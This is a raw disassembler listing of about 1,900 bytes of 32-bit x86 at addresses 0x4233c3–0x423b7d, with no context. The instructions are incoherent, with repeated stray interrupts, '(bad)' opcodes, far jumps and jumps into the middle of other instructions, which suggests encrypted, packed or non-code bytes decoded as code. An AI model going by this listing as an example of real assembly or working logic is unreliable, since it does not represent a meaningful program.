  4233c3:	add    BYTE PTR [eax-0x32c27233],0x76
  4233ca:	cmp    eax,0x3b5596cd
  4233cf:	jns    0x42340c
  4233d1:	or     al,0xd3
  4233d3:	lods   eax,DWORD PTR ds:[esi]
  4233d4:	sub    bl,dl
  4233d6:	jmp    0x42336a
  4233d8:	push   ebx
  4233d9:	jge    0x4233a8
  4233db:	jbe    0x42338a
  4233dd:	xor    edx,edx
  4233df:	cmp    ebx,edx
  4233e1:	clc    
  4233e2:	add    cl,BYTE PTR [edx]
  4233e4:	jbe    0x42337b
  4233e6:	int    0x76
  4233e8:	sbb    eax,0x3b1d8dcd
  4233ed:	lds    edi,FWORD PTR [ebx]
  4233ef:	psrlq  mm6,mm2
  4233f2:	sub    bl,dl
  4233f4:	mov    ebp,0xcdd35392
  4233f9:	lea    edx,[ebp+0x16d87d43]
  4233ff:	int    0x76
  423401:	sbb    eax,0x3b1d8dcd
  423406:	lds    edi,FWORD PTR [ebx]
  423408:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  42340f:	push   ebx
  423410:	ror    DWORD PTR [edx],cl
  423412:	jbe    0x4233a9
  423414:	int    0x76
  423416:	cmp    eax,0x3b3d8dcd
  42341b:	lds    edi,FWORD PTR [ebx]
  42341d:	psrlq  mm7,QWORD PTR [ebp+0x28f2d392]
  423424:	push   ebx
  423425:	ror    ebp,cl
  423427:	lea    edx,[ebp+0xad3d12f]
  42342d:	jbe    0x4233c4
  42342f:	int    0x76
  423431:	inc    ebp
  423432:	int    0x8d
  423434:	inc    ebp
  423435:	cmp    eax,ebp
  423437:	cmp    ecx,DWORD PTR [edi]
  423439:	shl    edx,cl
  42343b:	sub    bl,dl
  42343d:	mov    ebp,0xcdd35392
  423442:	lea    edx,[ebp+0x52f7d43]
  423448:	pusha  
  423449:	xchg   edx,eax
  42344a:	add    BYTE PTR [eax+0xa9576cd],0x76
  423451:	or     eax,0x875576cd
  423456:	jbe    0x423428
  423458:	or     ah,dh
  42345a:	xchg   ebp,eax
  42345b:	or     dh,BYTE PTR [esi+0x6d]
  42345e:	pop    ebp
  42345f:	inc    ecx
  423460:	and    DWORD PTR [esi+0x5d760a35],eax
  423466:	leave  
  423467:	jbe    0x42347e
  423469:	cmp    DWORD PTR [ecx],esp
  42346b:	xchg   BYTE PTR ds:0xb23576c9,dh
  423471:	and    DWORD PTR [esi-0xe89f5cb],eax
  423477:	int    0x76
  423479:	xchg   ebp,eax
  42347a:	int    0x8d
  42347c:	xchg   ebp,eax
  42347d:	cmp    eax,ebp
  42347f:	cmp    ecx,DWORD PTR [edi]
  423481:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423487:	push   ebx
  423488:	ror    DWORD PTR [edx],cl
  42348a:	jbe    0x423509
  42348c:	int    0x6d
  42348e:	jmp    0x423496
  423490:	add    DWORD PTR [eax-0x36923280],0x7006
  42349a:	add    BYTE PTR [ebx],cl
  42349c:	and    DWORD PTR [esi-0x369232cb],eax
  4234a2:	push   es
  4234a3:	xchg   esp,eax
  4234a4:	add    BYTE PTR [eax],al
  4234a6:	add    bh,dh
  4234a8:	and    DWORD PTR [esi-0x329232cb],eax
  4234ae:	ins    DWORD PTR es:[edi],dx
  4234af:	int    0x76
  4234b1:	icebp  
  4234b2:	int    0x8d
  4234b4:	icebp  
  4234b5:	cmp    eax,ebp
  4234b7:	cmp    ecx,DWORD PTR [edi]
  4234b9:	sar    DWORD PTR [ebp+0x28f2d392],cl
  4234bf:	push   ebx
  4234c0:	ror    ebp,cl
  4234c2:	lea    edi,[ebp+0x2f]
  4234c5:	rcl    ebx,1
  4234c7:	int    0x8d
  4234c9:	ins    DWORD PTR es:[edi],dx
  4234ca:	retf   0x8884
  4234cd:	or     DWORD PTR [esi-0x57],esi
  4234d0:	int    0x6d
  4234d2:	int    0x76
  4234d4:	icebp  
  4234d5:	int    0x8d
  4234d7:	icebp  
  4234d8:	cmp    ecx,DWORD PTR [edi]
  4234da:	cmp    eax,ebp
  4234dc:	shl    edx,cl
  4234de:	sub    bl,dl
  4234e0:	mov    ebp,0xcdd35392
  4234e5:	lea    edi,[ebp+0x2f]
  4234e8:	rcl    ebx,1
  4234ea:	int    0x8d
  4234ec:	adc    eax,0x3b1596cd
  4234f1:	or     al,0x3b
  4234f3:	cdq    
  4234f4:	shr    ebx,cl
  4234f6:	xchg   edx,eax
  4234f7:	shr    edx,cl
  4234f9:	sub    BYTE PTR [ebx+0x13],dl
  4234fc:	xchg   ebx,edx
  4234fe:	int    0x8d
  423500:	ins    DWORD PTR es:[edi],dx
  423501:	das    
  423502:	pop    ecx
  423503:	dec    esp
  423504:	mov    ch,cl
  423506:	push   es
  423507:	jo     0x423509
  423509:	add    BYTE PTR [eax],al
  42350b:	int    0x17
  42350d:	jo     0x42350f
  42350f:	add    BYTE PTR [eax],al
  423511:	cmp    eax,ebp
  423513:	cmp    ebx,DWORD PTR [ecx-0x2c6d422d]
  423519:	jmp    0x2fd3:0x87d25328
  423520:	pop    ecx
  423521:	lea    ebp,[ecx-0x72f682c5]
  423527:	test   eax,0x76ca6dcd
  42352c:	test   eax,0xcdf18dcd
  423531:	xchg   esi,eax
  423532:	icebp  
  423533:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423536:	cdq    
  423537:	shr    edx,cl
  423539:	sub    bl,dl
  42353b:	jmp    0x4234cf
  42353d:	push   ebx
  42353e:	adc    ecx,ebp
  423540:	xchg   esi,eax
  423541:	jge    0x423572
  423543:	rcl    DWORD PTR [ebx],1
  423545:	int    0x96
  423547:	ins    DWORD PTR es:[edi],dx
  423548:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  42354f:	icebp  
  423550:	int    0x8d
  423552:	icebp  
  423553:	cmp    eax,ebp
  423555:	cmp    ecx,DWORD PTR [edi]
  423557:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42355d:	push   ebx
  42355e:	ror    ebp,cl
  423560:	lea    edi,[ebp+0x2f]
  423563:	rcl    ebx,1
  423565:	int    0x8d
  423567:	ins    DWORD PTR es:[edi],dx
  423568:	retf   0x8884
  42356b:	or     DWORD PTR [esi-0x57],esi
  42356e:	int    0x6d
  423570:	int    0x76
  423572:	icebp  
  423573:	int    0x8d
  423575:	icebp  
  423576:	cmp    eax,ebp
  423578:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  42357e:	repnz sub BYTE PTR [ebx-0x2d],dl
  423582:	int    0x8d
  423584:	jge    0x4235b5
  423586:	rcl    ebx,1
  423588:	int    0x8d
  42358a:	pop    ebp
  42358b:	int    0x96
  42358d:	pop    ebp
  42358e:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423591:	cdq    
  423592:	shr    ebx,cl
  423594:	xchg   edx,eax
  423595:	shr    edx,cl
  423597:	sub    BYTE PTR [ebx+0x13],dl
  42359a:	xchg   ebx,edx
  42359c:	int    0x8d
  42359e:	ins    DWORD PTR es:[edi],dx
  42359f:	das    
  4235a0:	pop    ecx
  4235a1:	dec    esp
  4235a2:	mov    ch,cl
  4235a4:	push   es
  4235a5:	xchg   esp,eax
  4235a6:	add    BYTE PTR [eax],al
  4235a8:	add    ch,cl
  4235aa:	pop    ss
  4235ab:	xchg   esp,eax
  4235ac:	add    BYTE PTR [eax],al
  4235ae:	add    BYTE PTR [ebx],bh
  4235b0:	lds    edi,FWORD PTR [ebx]
  4235b2:	cdq    
  4235b3:	sar    DWORD PTR [ebp+0x28ead392],cl
  4235b9:	push   ebx
  4235ba:	rol    BYTE PTR [edi-0x72a6d02d],cl
  4235c0:	test   eax,0x8d097d3b
  4235c5:	test   eax,0x76ca6dcd
  4235ca:	test   eax,0xcdf18dcd
  4235cf:	xchg   esi,eax
  4235d0:	icebp  
  4235d1:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4235d4:	cdq    
  4235d5:	shr    edx,cl
  4235d7:	sub    bl,dl
  4235d9:	jmp    0x42356d
  4235db:	push   ebx
  4235dc:	adc    ecx,ebp
  4235de:	xchg   esi,eax
  4235df:	jge    0x423610
  4235e1:	rcl    DWORD PTR [ebx],1
  4235e3:	int    0x96
  4235e5:	ins    DWORD PTR es:[edi],dx
  4235e6:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  4235ed:	xor    eax,0x3b358dcd
  4235f2:	(bad)  
  4235f4:	(bad)
  4235f7:	sub    bl,dl
  4235f9:	mov    ebp,0xcdd35392
  4235fe:	lea    ebx,[ebp-0x33]
  423601:	xchg   esi,eax
  423602:	pop    ebp
  423603:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423606:	cdq    
  423607:	shr    ebx,cl
  423609:	xchg   edx,eax
  42360a:	shr    edx,cl
  42360c:	sub    BYTE PTR [ebx+0x13],dl
  42360f:	das    
  423610:	rcl    ebx,1
  423612:	xchg   DWORD PTR [esi+0x7d],esi
  423615:	or     dh,BYTE PTR [esi+0x7d]
  423618:	int    0x76
  42361a:	jge    0x4235e9
  42361c:	lea    ecx,ds:0xb2f7d43
  423622:	(bad)  
  423623:	inc    DWORD PTR [eax]
  423625:	add    ch,cl
  423627:	jbe    0x423686
  423629:	int    0x8d
  42362b:	pop    ebp
  42362c:	cmp    ecx,DWORD PTR [edi]
  42362e:	shl    edx,cl
  423630:	sub    BYTE PTR [ebx],bh
  423632:	(bad)
  423635:	xchg   edx,eax
  423636:	push   ebx
  423637:	ror    ebp,cl
  423639:	lea    ecx,ds:0xcdd3d12f
  42363f:	lea    edx,[ebp-0x142cf3c5]
  423645:	xchg   edx,eax
  423646:	push   ebx
  423647:	ror    ebp,cl
  423649:	lea    edx,[ebp-0xd2cf0c5]
  42364f:	sub    BYTE PTR [ebx-0x2d],dl
  423652:	or     dh,BYTE PTR [esi+0x35]
  423655:	int    0x76
  423657:	popf   
  423658:	int    0x8d
  42365a:	popf   
  42365b:	cmp    ecx,DWORD PTR [edi]
  42365d:	shl    edx,cl
  42365f:	sub    BYTE PTR [ebx],bh
  423661:	(bad)
  423664:	xchg   edx,eax
  423665:	push   ebx
  423666:	ror    ebp,cl
  423668:	lea    ebx,[ebp+0x3b9d96cd]
  42366e:	or     al,0xd3
  423670:	jmp    0x423604
  423672:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  423678:	adc    eax,DWORD PTR [edi+0x7d87358d]
  42367e:	xchg   DWORD PTR [ebp+0x558d0a55],ecx
  423684:	in     al,dx
  423685:	sbb    al,0xcd
  423687:	jbe    0x423626
  423689:	int    0x8d
  42368b:	popf   
  42368c:	cmp    eax,ebp
  42368e:	cmp    ecx,DWORD PTR [edi]
  423690:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423696:	push   ebx
  423697:	rol    DWORD PTR [edi+0x760a5576],cl
  42369d:	push   ebp
  42369e:	int    0x76
  4236a0:	popf   
  4236a1:	int    0x8d
  4236a3:	popf   
  4236a4:	cmp    eax,ebp
  4236a6:	sar    DWORD PTR [ebp-0x2cf0c46e],cl
  4236ac:	repnz sub BYTE PTR [ebx-0x2d],dl
  4236b0:	int    0x8d
  4236b2:	lods   eax,DWORD PTR ds:[esi]
  4236b3:	xor    edi,DWORD PTR [ebp-0x33]
  4236b6:	jbe    0x423655
  4236b8:	int    0x96
  4236ba:	popf   
  4236bb:	cmp    eax,ebp
  4236bd:	cmp    ebx,DWORD PTR [ecx-0x2cd7152d]
  4236c3:	mov    ebp,0xcdd25392
  4236c8:	xchg   esi,eax
  4236c9:	push   ebp
  4236ca:	das    
  4236cb:	rcl    edx,1
  4236cd:	inc    ebx
  4236ce:	shr    DWORD PTR [edi],cl
  4236d0:	pop    es
  4236d1:	adc    ebp,edi
  4236d3:	add    BYTE PTR [eax],al
  4236d5:	int    0x76
  4236d7:	stc    
  4236d8:	int    0x76
  4236da:	stc    
  4236db:	int    0x76
  4236dd:	std    
  4236de:	or     dh,BYTE PTR [esi+0x35]
  4236e1:	int    0x76
  4236e3:	mov    ch,cl
  4236e5:	lea    esp,ds:0x3b2596cd
  4236eb:	or     al,0xd3
  4236ed:	jmp    0x423681
  4236ef:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4236f5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4236fc:	jno    0x4236cb
  4236fe:	lea    esp,[ebp-0x33]
  423701:	xchg   esi,eax
  423702:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  423706:	cdq    
  423707:	shr    ebx,cl
  423709:	xchg   edx,eax
  42370a:	shr    edx,cl
  42370c:	sub    BYTE PTR [ebx+0x13],dl
  42370f:	jno    0x4236de
  423711:	(bad)  
  423712:	stc    
  423713:	int    0x96
  423715:	stc    
  423716:	add    dh,dl
  423718:	xor    eax,0x993b0c3b
  42371d:	shr    ebx,cl
  42371f:	xchg   edx,eax
  423720:	shr    edx,cl
  423722:	sub    BYTE PTR [ebx+0x13],dl
  423725:	jno    0x423727
  423727:	jo     0x42373d
  423729:	int    0x8d
  42372b:	stc    
  42372c:	int    0x96
  42372e:	stc    
  42372f:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423732:	cdq    
  423733:	shr    ebx,cl
  423735:	xchg   edx,eax
  423736:	shr    edx,cl
  423738:	sub    BYTE PTR [ebx+0x13],dl
  42373b:	or     dh,BYTE PTR [esi+0x65]
  42373e:	inc    ebx
  42373f:	jge    0x423770
  423741:	add    eax,0x808080ab
  423746:	int    0x76
  423748:	stc    
  423749:	in     al,dx
  42374a:	(bad)  
  42374b:	int    0x96
  42374d:	or     dh,BYTE PTR gs:[esi-0x53]
  423751:	push   ecx
  423752:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423753:	lods   eax,DWORD PTR ds:[esi]
  423754:	int    0x8d
  423756:	lods   eax,DWORD PTR ds:[esi]
  423757:	shr    ebx,cl
  423759:	xchg   edx,eax
  42375a:	cmp    edi,DWORD PTR [ecx-0x2d]
  42375d:	lods   eax,DWORD PTR ds:[esi]
  42375e:	sub    BYTE PTR [ebx-0x2d],dl
  423761:	int    0x8d
  423763:	jne    0x42372f
  423765:	dec    esp
  423766:	or     DWORD PTR [ecx],0x8dcd304c
  42376c:	mov    ch,0xcd
  42376e:	lea    esi,[ebp+0x3bb596cd]
  423774:	or     al,0x3b
  423776:	cdq    
  423777:	shr    edx,cl
  423779:	sub    bl,dl
  42377b:	jmp    0x42370f
  42377d:	push   ebx
  42377e:	adc    ecx,ebp
  423780:	xchg   esi,eax
  423781:	mov    ch,0x87
  423783:	jge    0x423752
  423785:	jbe    0x423734
  423787:	cmp    edx,ebp
  423789:	add    al,0xad
  42378b:	std    
  42378c:	add    al,0xea
  42378e:	std    
  42378f:	shr    ebx,cl
  423791:	sub    BYTE PTR [edi+0x3bd353d2],al
  423797:	leave  
  423798:	int    0x8d
  42379a:	std    
  42379b:	int    0x96
  42379d:	std    
  42379e:	shr    edx,cl
  4237a0:	xchg   edx,eax
  4237a1:	shr    ebx,cl
  4237a3:	sub    BYTE PTR [ebx-0x1d],dl
  4237a6:	cmp    ebx,ecx
  4237a8:	inc    ebx
  4237a9:	rcl    dh,cl
  4237ab:	mov    ds:0xcd8876cd,eax
  4237b0:	lea    ebp,ds:0xcd2d96cd
  4237b6:	add    DWORD PTR [ecx],edx
  4237b8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  4237c2:	shr    edx,cl
  4237c4:	sub    BYTE PTR [ebx+0x13],dl
  4237c7:	jno    0x423796
  4237c9:	(bad)  
  4237ca:	stc    
  4237cb:	int    0x96
  4237cd:	stc    
  4237ce:	cmp    ecx,DWORD PTR [ebx+edi*1]
  4237d1:	cdq    
  4237d2:	shr    ebx,cl
  4237d4:	xchg   edx,eax
  4237d5:	shr    edx,cl
  4237d7:	sub    BYTE PTR [ebx+0x13],dl
  4237da:	jno    0x4237dc
  4237dc:	(bad)  
  4237dd:	jne    0x4237df
  4237df:	jo     0x4237fd
  4237e1:	int    0x76
  4237e3:	or     dh,BYTE PTR gs:[esi+0x75]
  4237e7:	int    0x76
  4237e9:	xor    eax,0xcdfd760a
  4237ee:	jbe    0x4237ed
  4237f0:	cmp    ecx,ebx
  4237f2:	add    al,0xbd
  4237f4:	test   ah,dl
  4237f6:	xor    ecx,ebp
  4237f8:	jbe    0x42386f
  4237fa:	int    0x14
  4237fc:	mov    ch,cl
  4237fe:	jbe    0x423875
  423800:	int    0x84
  423802:	mov    BYTE PTR [ebx],bh
  423804:	jns    0x423841
  423806:	aad    0xd3
  423808:	lods   eax,DWORD PTR ds:[esi]
  423809:	sub    bl,dl
  42380b:	repz xchg edx,eax
  42380d:	push   ebx
  42380e:	ror    ch,cl
  423810:	xchg   esi,eax
  423811:	jne    0x42381d
  423813:	test   BYTE PTR [edx-0x33],cl
  423816:	jbe    0x423815
  423818:	add    al,0xd3
  42381a:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423821:	xlat   BYTE PTR ds:[ebx]
  423822:	int    0x76
  423824:	std    
  423825:	cmp    ecx,ebx
  423827:	add    al,0xbd
  423829:	test   ah,dl
  42382b:	xor    ecx,ebp
  42382d:	jbe    0x4238a4
  42382f:	int    0x14
  423831:	mov    ch,cl
  423833:	jbe    0x4238aa
  423835:	int    0x84
  423837:	mov    BYTE PTR [ebx],bh
  423839:	jns    0x423876
  42383b:	aad    0xd3
  42383d:	lods   eax,DWORD PTR ds:[esi]
  42383e:	sub    bl,dl
  423840:	repz xchg edx,eax
  423842:	push   ebx
  423843:	ror    ch,cl
  423845:	xchg   esi,eax
  423846:	jne    0x423852
  423848:	test   BYTE PTR [edx-0x33],cl
  42384b:	jbe    0x42384a
  42384d:	add    al,0xd3
  42384f:	test   BYTE PTR [edi*4-0x7d82bc7c],al
  423856:	xlat   BYTE PTR ds:[ebx]
  423857:	int    0x76
  423859:	jne    0x423865
  42385b:	jbe    0x42386a
  42385d:	int    0x76
  42385f:	mov    ch,0xcd
  423861:	lea    esi,[ebp+0xf3bc53b]
  423867:	shl    edx,cl
  423869:	sub    bl,dl
  42386b:	mov    ebp,0xcdd35392
  423870:	(bad)  
  423871:	stc    
  423872:	or     dh,BYTE PTR [esi+0x25]
  423875:	leave  
  423876:	jbe    0x423844
  423878:	imul   edi,DWORD PTR [ecx+0x69],0xb076c9d7
  42387f:	imul   edx,ebp,0x8d0a0c69
  423885:	gs adc bh,dl
  423888:	into   
  423889:	and    DWORD PTR [esi-0x32fad0cb],eax
  42388f:	add    BYTE PTR [eax+0xd96cd80],0xcd
  423896:	sar    DWORD PTR [ebx],cl
  423898:	lds    ecx,FWORD PTR [edx]
  42389a:	jbe    0x423849
  42389c:	rol    esi,cl
  42389e:	lods   eax,DWORD PTR ds:[esi]
  42389f:	xchg   edx,eax
  4238a0:	or     dh,BYTE PTR [esi-0x30]
  4238a3:	int    0xd3
  4238a5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238a8:	lods   eax,DWORD PTR ds:[esi]
  4238a9:	sub    BYTE PTR [ebx+0x76],dl
  4238ac:	lods   eax,DWORD PTR ds:[esi]
  4238ad:	retf   0x858c
  4238b0:	int3   
  4238b1:	das    
  4238b2:	imul   eax,DWORD PTR [eax+esi*1+0x1830201],0x592fbeeb
  4238bd:	retf   
  4238be:	inc    ebx
  4238bf:	rcl    esi,cl
  4238c1:	jle    0x423890
  4238c3:	jbe    0x42387a
  4238c5:	int    0x8d
  4238c7:	mov    ch,0xcd
  4238c9:	jbe    0x423880
  4238cb:	int    0x96
  4238cd:	mov    ch,0x3b
  4238cf:	jns    0x42390c
  4238d1:	or     al,0xd3
  4238d3:	lods   eax,DWORD PTR ds:[esi]
  4238d4:	sub    bl,dl
  4238d6:	jmp    0x42386a
  4238d8:	push   ebx
  4238d9:	jge    0x4238a8
  4238db:	jbe    0x423942
  4238dd:	cmp    edi,DWORD PTR [ecx-0x2d]
  4238e0:	lods   eax,DWORD PTR ds:[esi]
  4238e1:	sub    BYTE PTR [ebx+0x76],dl
  4238e4:	lods   eax,DWORD PTR ds:[esi]
  4238e5:	cmp    edx,ebp
  4238e7:	xchg   DWORD PTR [ebp-0x33],edi
  4238ea:	jbe    0x4238bc
  4238ec:	add    al,0xea
  4238ee:	std    
  4238ef:	add    al,0xad
  4238f1:	std    
  4238f2:	shr    ebx,cl
  4238f4:	sub    BYTE PTR [edi+0x3b1353f1],al
  4238fa:	lock or cl,BYTE PTR [ebp-0x3105ed9b]
  423901:	and    DWORD PTR [esi-0x323329cb],eax
  423907:	jbe    0x42392e
  423909:	in     al,dx
  42390a:	and    cl,ch
  42390c:	jbe    0x423907
  42390e:	int    0x8d
  423910:	stc    
  423911:	cmp    eax,ebp
  423913:	cmp    ecx,DWORD PTR [edi]
  423915:	sar    DWORD PTR [ebp+0x28f2d392],cl
  42391b:	push   ebx
  42391c:	ror    ebp,cl
  42391e:	(bad)  
  42391f:	stc    
  423920:	int    0x96
  423922:	stc    
  423923:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423926:	cdq    
  423927:	shr    ebx,cl
  423929:	xchg   edx,eax
  42392a:	shr    edx,cl
  42392c:	sub    BYTE PTR [ebx+0x13],dl
  42392f:	inc    ebx
  423930:	jge    0x423961
  423932:	add    eax,0x80809223
  423937:	int    0x76
  423939:	or     eax,0xa886ccd
  42393e:	out    0xb5,al
  423940:	leave  
  423941:	jbe    0x423968
  423943:	mov    dl,0x21
  423945:	xchg   BYTE PTR ds:0x393576c9,dh
  42394b:	and    DWORD PTR [esi-0x6a8936cb],eax
  423951:	dec    ecx
  423952:	mov    al,ds:0x76c93586
  423957:	lods   eax,DWORD PTR ds:[esi]
  423958:	imul   esp,DWORD PTR [ecx],0x76c93586
  42395e:	and    ch,BYTE PTR gs:[ebx-0x7a]
  423962:	xor    eax,0xcd3d760a
  423967:	jbe    0x4238f1
  423969:	int    0x8d
  42396b:	lods   eax,DWORD PTR ds:[esi]
  42396c:	int    0x96
  42396e:	lods   eax,DWORD PTR ds:[esi]
  42396f:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423972:	jmp    0x423906
  423974:	cmp    ebx,DWORD PTR [ecx+0x5328ead3]
  42397a:	adc    esi,DWORD PTR [ecx-0x33]
  42397d:	lea    edx,[ebp+0x3b9596cd]
  423983:	or     al,0xd3
  423985:	jmp    0x423919
  423987:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  42398d:	add    BYTE PTR [eax+0x5328ead3],0x13
  423994:	jno    0x423963
  423996:	lea    esp,[ebp-0x33]
  423999:	xchg   esi,eax
  42399a:	cmp    ecx,DWORD PTR gs:[ebx+edi*1]
  42399e:	cdq    
  42399f:	shr    ebx,cl
  4239a1:	xchg   edx,eax
  4239a2:	shr    edx,cl
  4239a4:	sub    BYTE PTR [ebx+0x13],dl
  4239a7:	jno    0x423976
  4239a9:	lea    esi,[ebp+0x3bb596cd]
  4239af:	or     al,0x3b
  4239b1:	cdq    
  4239b2:	shr    ebx,cl
  4239b4:	xchg   edx,eax
  4239b5:	shr    edx,cl
  4239b7:	sub    BYTE PTR [ebx+0x13],dl
  4239ba:	jno    0x4239bc
  4239bc:	jo     0x4239d2
  4239be:	or     dh,BYTE PTR [esi+0x65]
  4239c1:	int    0x76
  4239c3:	mov    ch,cl
  4239c5:	lea    ebp,[ebp+0x3bad96cd]
  4239cb:	or     al,0xd3
  4239cd:	jmp    0x423961
  4239cf:	cmp    ebx,DWORD PTR [ecx-0x7eeefe33]
  4239d5:	add    BYTE PTR [eax+0x5328ead3],0x13
  4239dc:	jno    0x4239ab
  4239de:	lea    edx,[ebp+0x3b9596cd]
  4239e4:	or     al,0x3b
  4239e6:	cdq    
  4239e7:	shr    ebx,cl
  4239e9:	xchg   edx,eax
  4239ea:	shr    edx,cl
  4239ec:	sub    BYTE PTR [ebx+0x13],dl
  4239ef:	jno    0x4239be
  4239f1:	lea    esi,[ebp+0xb596cd]
  4239f7:	(bad)  
  4239f8:	cmp    eax,0x993b0c3b
  4239fd:	shr    ebx,cl
  4239ff:	xchg   edx,eax
  423a00:	shr    edx,cl
  423a02:	sub    BYTE PTR [ebx+0x13],dl
  423a05:	jno    0x423a07
  423a07:	jo     0x423a1d
  423a09:	int    0x8d
  423a0b:	mov    ch,0xa
  423a0d:	jbe    0x4239bc
  423a0f:	int    0x76
  423a11:	mov    ch,0x3b
  423a13:	or     al,0x3b
  423a15:	jns    0x4239ea
  423a17:	jmp    0x4239ab
  423a19:	shr    DWORD PTR [ebp-0x3282acd8],cl
  423a1f:	jbe    0x423a86
  423a21:	inc    ebx
  423a22:	jge    0x423a53
  423a24:	add    eax,0x8080853c
  423a29:	int    0x8d
  423a2b:	mov    ch,0xcd
  423a2d:	xchg   esi,eax
  423a2e:	mov    ch,0x3b
  423a30:	or     al,0x3b
  423a32:	cdq    
  423a33:	shr    ebx,cl
  423a35:	xchg   edx,eax
  423a36:	shr    edx,cl
  423a38:	sub    BYTE PTR [ebx+0x13],dl
  423a3b:	inc    ebx
  423a3c:	lea    ebp,[ebp-0x7ab2fad1]
  423a42:	add    BYTE PTR [eax-0x32da7233],0x8d
  423a49:	and    eax,0x192ebd3
  423a4e:	add    ch,BYTE PTR [edi-0x723277f7]
  423a54:	mov    ch,0xcd
  423a56:	lea    esi,[ebp+0x192ebd3]
  423a5c:	add    ch,BYTE PTR [edi-0x327e83f7]
  423a62:	lea    esi,ds:0xd3358dcd
  423a68:	jmp    0x4239fc
  423a6a:	add    DWORD PTR [edx],eax
  423a6c:	scas   eax,DWORD PTR es:[edi]
  423a6d:	or     DWORD PTR [edx+edx*4+0x4],edi
  423a71:	aaa    
  423a72:	sbb    al,0x0
  423a74:	add    BYTE PTR [eax],al
  423a76:	add    BYTE PTR [edi+esi*1],0x24
  423a7a:	add    BYTE PTR [eax],al
  423a7c:	add    BYTE PTR [eax+0x24cfcf],al
  423a82:	add    BYTE PTR [eax],al
  423a84:	jno    0x423a86
  423a86:	(bad)  
  423a87:	cmp    eax,0x1ccfcf
  423a8c:	add    BYTE PTR [eax],al
  423a8e:	add    dh,dl
  423a90:	lods   eax,DWORD PTR ds:[esi]
  423a91:	jno    0x423a60
  423a93:	lea    ecx,ds:0xcd4c9100
  423a99:	lea    esi,[ebp+0x4]
  423a9c:	shl    DWORD PTR [eax],cl
  423a9e:	jno    0x423b10
  423aa0:	mov    ebp,0xefef
  423aa5:	or     dh,BYTE PTR [esi-0x30]
  423aa8:	int    0x76
  423aaa:	mov    ch,cl
  423aac:	lea    ebp,ds:0xcd2d96cd
  423ab2:	add    DWORD PTR [ecx],edx
  423ab4:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423abe:	shr    edx,cl
  423ac0:	sub    BYTE PTR [ebx+0x13],dl
  423ac3:	jno    0x423a92
  423ac5:	lea    esi,[ebp+0x3bb596cd]
  423acb:	or     al,0x3b
  423acd:	cdq    
  423ace:	shr    ebx,cl
  423ad0:	xchg   edx,eax
  423ad1:	shr    edx,cl
  423ad3:	sub    BYTE PTR [ebx+0x13],dl
  423ad6:	jno    0x423ad8
  423ad8:	(bad)  
  423ad9:	add    BYTE PTR gs:[eax+0x1c],dh
  423add:	int    0x76
  423adf:	rcl    bl,1
  423ae1:	ins    DWORD PTR es:[edi],dx
  423ae2:	xchg   edx,eax
  423ae3:	cmp    ecx,ecx
  423ae5:	inc    ebx
  423ae6:	leave  
  423ae7:	int    0x76
  423ae9:	mov    ch,cl
  423aeb:	lea    ebp,ds:0x811101cd
  423af1:	add    BYTE PTR [eax-0x29d26933],0x54
  423af8:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423afb:	cdq    
  423afc:	shr    ebx,cl
  423afe:	xchg   edx,eax
  423aff:	shr    edx,cl
  423b01:	sub    BYTE PTR [ebx+0x13],dl
  423b04:	jno    0x423ad3
  423b06:	lea    esi,[ebp+0x3bb596cd]
  423b0c:	or     al,0x3b
  423b0e:	cdq    
  423b0f:	shr    ebx,cl
  423b11:	xchg   edx,eax
  423b12:	shr    edx,cl
  423b14:	sub    BYTE PTR [ebx+0x13],dl
  423b17:	jno    0x423b19
  423b19:	(bad)  
  423b1a:	jne    0x423b1c
  423b1c:	jo     0x423b3a
  423b1e:	int    0x76
  423b20:	lods   eax,DWORD PTR ds:[esi]
  423b21:	or     dh,BYTE PTR [esi+0x75]
  423b24:	int    0x76
  423b26:	cmp    eax,0xecfd760a
  423b2b:	cmp    BYTE PTR [ebx],bh
  423b2d:	or     al,0x3b
  423b2f:	cdq    
  423b30:	shr    ebx,cl
  423b32:	xchg   edx,eax
  423b33:	shr    edx,cl
  423b35:	sub    BYTE PTR [ebx+0x13],dl
  423b38:	jno    0x423b07
  423b3a:	lea    esi,[ebp+0x3bb596cd]
  423b40:	or     al,0x3b
  423b42:	cdq    
  423b43:	shr    ebx,cl
  423b45:	xchg   edx,eax
  423b46:	shr    edx,cl
  423b48:	sub    BYTE PTR [ebx+0x13],dl
  423b4b:	jno    0x423b4d
  423b4d:	(bad)  
  423b4e:	lods   eax,DWORD PTR ds:[esi]
  423b4f:	add    BYTE PTR [eax+0x1c],dh
  423b52:	int    0x76
  423b54:	std    
  423b55:	or     dh,BYTE PTR [esi+0x1d]
  423b58:	int    0x76
  423b5a:	jne    0x423b66
  423b5c:	out    0x55,al
  423b5e:	or     dh,BYTE PTR [esi-0x30]
  423b61:	leave  
  423b62:	jbe    0x423b01
  423b64:	inc    ecx
  423b65:	and    DWORD PTR [esi+0x5576cd35],eax
  423b6b:	int    0x8d
  423b6d:	push   ebp
  423b6e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423b71:	or     al,0xd3
  423b73:	lods   eax,DWORD PTR ds:[esi]
  423b74:	sub    bl,dl
  423b76:	jmp    0x423b0a
  423b78:	push   ebx
  423b79:	ror    DWORD PTR [edx],cl
  423b7b:	jbe    0x423bc2
  423b7d:	int    0x76
